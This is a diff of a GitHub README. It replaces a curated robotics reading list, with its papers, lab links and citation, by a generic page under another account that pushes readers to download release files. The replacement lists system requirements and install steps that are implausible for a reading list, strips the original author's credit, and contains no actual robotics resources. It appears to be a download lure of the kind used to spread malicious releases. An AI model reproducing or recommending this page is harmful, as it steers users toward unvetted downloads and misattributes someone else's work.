@@ -1,92 +1,79 @@
-# Frontier Robotics Reading List
-[Jacob Rintamaki's](https://x.com/jacobrintamaki) curated repository of frontier robotics research, essays, and more. 
+# 🤖 Frontier_Robotics_Reading_List - Discover Essential Robotics Resources
 
-This repository is meant to try to capture some of what I'm currently thinking about.
+## 📥 Download Now
+[![Download Frontier Robotics Reading List](https://img.shields.io/badge/Download%20Frontier%20Robotics%20Reading%20List-blue.svg)](https://github.com/Rishab17066/Frontier_Robotics_Reading_List/releases)
 
-I will release a significantly more comprehensive, education-focused repository soon, which will be linked here.
+## 🚀 Getting Started
+Welcome to the **Frontier Robotics Reading List**! This is a curated collection of valuable content related to frontier robotics. Whether you are a student, an enthusiast, or a professional looking to deepen your understanding of robotics, you will find resources here to help you.
 
-# What Does This Repository Have? 
+## 📃 What You Will Find
+In this repository, you will discover various articles, research papers, and tools that cover a wide range of topics in robotics. Below are some resource types you can expect to find:
 
-- [Markets and Supply Chain](#markets-and-supply-chain) 
-- [Locomanipulation](#locomanipulation)
-- [Dexterous Manipulation](#dexterous-manipulation)
-- [VLAs](#vlas)
-- [World Models](#world-models)
-- [Reinforcement Learning](#reinforcement-learning)
-- [Real-World Deployments](#real-world-deployments)
-- [Thematic Writing](#thematic-writing)
-- [Citation](#citation)
+- Research papers on the latest advancements in robotics
+- Tutorials for beginners to learn robotics concepts
+- Guidelines on robotics projects and applications
+- Recommended books and online courses
 
-## Markets and Supply Chain <a name="markets-and-supply-chain"></a>
-- **Quadruped State of The Market:** Unitree, Boston Dynamics, ANYbotics, DEEP Robotics, and The Rising Application Ecosystem [[Post](https://newsletter.semianalysis.com/p/quadruped-state-of-the-market-unitree)]
-- **Citrini:** Thematic Primer: Humanoid Robots [[Post](https://www.citrini.com/post/thematic-primer-humanoid-robots)]
+## 🖥️ System Requirements
+To run the resources provided in this repository, you will need a device with the following specifications:
 
-## Locomanipulation <a name="locomanipulation"></a>
-* **DoorMan:** Opening the Sim-to-Real Door for Humanoid Pixel-to-Action Policy Transfer [[Project Page](https://doorman-humanoid.github.io/)]
-* **TWIST2:** Scalable, Portable, and Holistic Humanoid Data Collection System [[Website](https://yanjieze.com/TWIST2/)]
-* **VIRAL:** Visual Sim-to-Real at Scale for Humanoid Loco-Manipulation [[Paper](https://arxiv.org/abs/2511.15200)]
-* **LeCAR Lab** at CMU [[Website](https://lecar-lab.github.io/)]
+- **Operating System:** Windows 10, macOS 10.14+, or a Linux distribution.
+- **Memory:** At least 2 GB of RAM.
+- **Storage:** At least 100 MB of free space.
+- **Internet Connection:** Required for downloading resources.
 
-## Dexterous Manipulation <a name="dexterous-manipulation"></a>  
-- **Shuran Song:** Stanford Lab [[Website](https://shurans.github.io/)]
-- **In-the-Wild** Compliant Manipulation with UMI-FT [[Paper](https://arxiv.org/html/2601.09988v1)]
-- **Yuke Zhu:** UT Austin/NVIDIA GEAR lab [[Website](https://yukezhu.me/)]
+## ⚙️ Download & Install
+To get started with the **Frontier Robotics Reading List**, follow these simple steps:
 
-## VLAs <a name="vlas"></a>
-- **VLM4VLA:** Revisiting Vision-Language Models in Vision-Language-Action Models [[Project Page](https://cladernyjorn.github.io/VLM4VLA.github.io/)]
-- **ACT-1:** A Robot Foundation Model Trained on Zero Robot Data [[Website](https://www.sunday.ai/journal/no-robot-data)]
-- **State of Robot Learning** — December 2025 [[Essay](https://vedder.io/misc/state_of_robot_learning_dec_2025.html)]
-- **π*0.6:** a VLA that Learns from Experience [[Website](https://www.pi.website/blog/pistar06)]
-- **Emergence** of Human to Robot Transfer in VLAs [[Website](https://www.pi.website/research/human_to_robot)]
-- **Moravec's Paradox** and the Robot Olympics [[Website](https://www.pi.website/blog/olympics)]
-- **Training-Time** Action Conditioning for Efficient Real-Time Chunking [[Paper](https://arxiv.org/abs/2512.05964)]
-- **GEN-0:** Embodied Foundation Models That Scale with Physical Interaction [[Post](https://generalistai.com/blog/nov-04-2025-GEN-0)]
+1. **Visit the Releases Page:**
+   Click the link below to access the latest releases:
+   [Visit Releases Page](https://github.com/Rishab17066/Frontier_Robotics_Reading_List/releases)
 
-## World Models <a name="world-models"></a>
-- **Skild AI:** Announcing Series C [[Website](https://www.skild.ai/blogs/series-c)]
-- **1X World Model:** From Video to Action: A New Way Robots Learn [[Website](https://www.1x.tech/discover/world-model-self-learning)]
-- **Preference Learning** For Robotic World Model Policies [[Tweet](https://x.com/JackMonas/status/2011142087484338333?s=20)]
-- **Test Time Compute** For Robotic World Model Policies [[Tweet](https://x.com/itsdanielho/status/2011186214812975113?s=20)]
+2. **Choose Your Resources:**
+   On the releases page, you will find several versions of the curated list. Most of these resources are downloadable as PDFs or links to outdoor platforms. 
 
-## Reinforcement Learning <a name="reinforcement-learning"></a>
-- **RL-100:** Performant Robotic Manipulation with Real-World Reinforcement Learning [[Paper](https://arxiv.org/abs/2510.14830)]
-- **HiL-SERL:** Precise and Dexterous Robotic Manipulation via Human-in-the-Loop Reinforcement Learning [[Website](https://hil-serl.github.io/)]
-- **Posterior Behavioral Cloning:** Pretraining BC Policies for Efficient RL Finetuning [[Paper](https://arxiv.org/abs/2512.16911)]
-- **SpeedTuning:** Speeding Up Policy Execution with Lightweight Reinforcement Learning [[Paper](https://ieeexplore.ieee.org/document/11128753)]
-- **SpeedAug:** Policy Acceleration via Tempo-Enriched Policy and RL Fine-Tuning [[Paper](https://arxiv.org/abs/2512.00062)]
+3. **Download the Files:**
+   Click on the resource you want to download. Your browser will start downloading the file to your computer.
 
-## Real-World Deployments <a name="real-world-deployments"></a>
-- **2025 BEHAVIOR** Challenge Results [[Website](https://behavior.stanford.edu/challenge/index.html)]
-- **Learning on the Fly:** Rapid Policy Adaptation via Differentiable Simulation [[Website](https://rpg.ifi.uzh.ch/lotf/)]
-- **Robotics** Levels Of Autonomy [[Post](https://newsletter.semianalysis.com/p/robotics-levels-of-autonomy)]
-- **Auki** Labs [[X Account](https://x.com/AukiLabs)]
-- **Dimensional** OS [[X Account](https://x.com/dimensionalos)]
-- **SOP:** Scaling General-Purpose Robots in the Real World [[Website](https://agibot.com/research/sop)]
-- **The Physical AI** Deployment Gap [[Essay](https://x.com/oyhsu/status/2011099777665036768?s=20)]
-- **Dyna:** Open-World Dexterity and Live Demos around the World [[Website](https://www.dyna.co/dyna-2/research)]
+4. **Open the Resources:**
+   After the download completes, locate the file on your device and open it. If it's a PDF, you may need a PDF reader, which is commonly pre-installed on most devices.
 
-## Thematic Writing <a name="thematic-writing"></a>
-- **The case** for an omni-bodied robot brain [[Blog Post](https://www.skild.ai/blogs/omni-bodied)]
-- **Eric Jang:** All Roads Lead to Robotics [[Blog Post](https://evjang.com/2024/03/03/all-roads-robots.html)]
-- **Sergey Levine:** Sporks of AGI: Why the Real Thing is better than the Next Best Thing [[Blog Post](https://sergeylevine.substack.com/p/sporks-of-agi)]
-- **A Love Letter** to CVPR [[Blog Post](https://vedder.io/misc/lover_letter_to_cvpr.html)]
-- **The Final** Offshoring [Website](https://finaloffshoring.com/) 
-- **Many Small Steps** for Robots, One Giant Leap for Mankind [[Blog Post](https://www.notboring.co/p/robot-steps)]
+5. **Start Exploring:**
+   Go through the reading materials at your pace. Take notes and apply the knowledge to your projects or studies.
 
+## 📚 Additional Content
+In addition to static resources, this repository may contain links to external websites and tools for a hands-on experience. Some types of content you might encounter include:
 
-## Citation <a name="citation"></a>
-If you find this repository useful, please consider citing this list:
+- **Interactive Tutorials:** Engage with online platforms to gain practical experience.
+- **Video Lectures:** Enrich your learning through visual content from experts in the field.
+- **Community Forums:** Join discussions and ask questions to enhance your understanding of robotics.
 
-```
-@misc{rintamaki2026frontierroboticsreadinglistrepo,
-    title={Frontier_Robotics_Reading_List},
-    author={Jacob Rintamaki},
-    journal={GitHub repository},
-    url={https://github.com/jrin771/Frontier_Robotics_Reading_List},
-    year={2026},
-}
-```
+## 🛠️ Contributing
+If you have valuable resources to share that you believe should be included, feel free to contribute. Follow these steps:
 
+1. **Fork the Repository:** Click on the "Fork" button at the top right corner of the repository page to create a copy.
 
+2. **Add Resources:** Add your resources to the appropriate sections in the repository.
 
+3. **Submit a Pull Request:** Once you have added your content, submit a pull request for review.
 
+We appreciate your contributions and dedication to enhancing the frontier robotics community.
+
+## 👍 Frequently Asked Questions
+
+### 1. How do I know if a resource is suitable for me?
+Each resource typically has a brief description. Look for keywords like "beginner," "intermediate," or "advanced" to gauge its suitability.
+
+### 2. Can I use these resources for my projects?
+Yes, these resources are intended to support your learning and project development. Ensure you check the permissions and licensing on external materials.
+
+### 3. What if I encounter a problem downloading?
+If you experience any issues, make sure you have a reliable internet connection. Try refreshing the page or using a different browser. If problems persist, feel free to reach out for support.
+
+## 📫 Contact
+For any inquiries or support, please contact the repository maintainer at the email provided in the main GitHub profile. We'll be happy to help you navigate your learning journey in frontier robotics.
+
+## 🕒 Stay Updated
+To keep your learning path up-to-date, regularly check back on the releases page for new additions and updates to the reading list.
+
+Enjoy your journey through the world of frontier robotics!
